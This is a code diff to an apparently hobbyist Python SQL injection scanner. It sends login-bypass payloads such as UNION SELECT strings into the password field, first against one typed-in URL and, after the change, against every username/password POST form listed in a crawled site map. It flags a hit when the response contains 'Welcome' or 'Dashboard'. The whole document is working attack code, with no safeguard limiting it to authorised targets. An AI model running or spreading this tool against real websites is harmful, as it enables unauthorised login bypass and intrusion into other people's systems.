@@ -1,7 +1,9 @@
 import requests
+import json
 
-# Target URL
-target_url = input("Enter the target URL (e.g., http://example.com/login): ")
+# Load mapped website data
+with open("mapped_data.json", "r") as f:
+    mapped_data = json.load(f)
 
 # SQL Injection Payloads
 payloads = [
@@ -12,26 +14,31 @@ payloads = [
     "' UNION SELECT NULL, user() --"
 ]
 
-# Data format for login form (Change 'username' and 'password' to match your form field names)
-post_data = {
-    "username": "admin",
-    "password": ""  # This will be filled with SQL injection payloads
-}
+print("\n🔍 Scanning for SQL Injection vulnerabilities...\n")
 
-print(f"\nScanning {target_url} for SQL Injection...\n")
+# Iterate over all discovered forms
+for entry in mapped_data:
+    if entry["method"] == "POST" and "username" in entry["inputs"] and "password" in entry["inputs"]:
+        target_url = entry["url"]  # Use the form's action URL
+        print(f"📌 Testing: {target_url}")
 
-for payload in payloads:
-    post_data["password"] = payload  # Inject payload into password field
-    print(f"Testing: {payload}")
+        # Prepare data dictionary
+        post_data = {"username": "admin", "password": ""}
 
-    try:
-        response = requests.post(target_url, data=post_data)
-        
-        if "Welcome" in response.text or "Dashboard" in response.text:  # Modify based on your site’s response
-            print("Possible SQL Injection Detected!")
-            print(f"Vulnerable payload: {payload}")
-            break
-    except Exception as e:
-        print(f"Error: {e}")
+        # Inject SQL payloads
+        for payload in payloads:
+            post_data["password"] = payload
+            print(f"🛠️  Testing payload: {payload}")
 
-print("Scan complete!")
+            try:
+                response = requests.post(target_url, data=post_data)
+
+                # Modify this condition based on how your app responds to successful logins
+                if "Welcome" in response.text or "Dashboard" in response.text:
+                    print(f"⚠️  Possible SQL Injection Detected at {target_url}!")
+                    print(f"🚀 Vulnerable payload: {payload}")
+                    break  # Stop testing if we find a vulnerability
+            except Exception as e:
+                print(f"❌ Error: {e}")
+
+print("\n✅ Scan complete!")
